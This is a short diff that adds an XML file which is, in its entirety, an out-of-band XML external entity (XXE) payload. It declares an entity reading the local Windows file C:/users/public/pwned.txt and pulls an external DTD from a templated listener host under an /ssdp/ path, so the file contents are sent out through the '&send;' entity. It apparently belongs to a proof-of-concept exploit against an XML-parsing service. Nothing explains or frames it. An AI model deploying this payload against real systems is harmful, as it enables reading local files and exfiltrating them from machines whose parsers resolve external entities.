@@ -1,0 +1,7 @@
+<!DOCTYPE data[
+<!ENTITY % file SYSTEM "file:///C:/users/public/pwned.txt">
+<!ENTITY % dtd SYSTEM "http://$localIp:$localPort/ssdp/data.dtd">
+%dtd;
+]>
+<data>&send;</data>
+
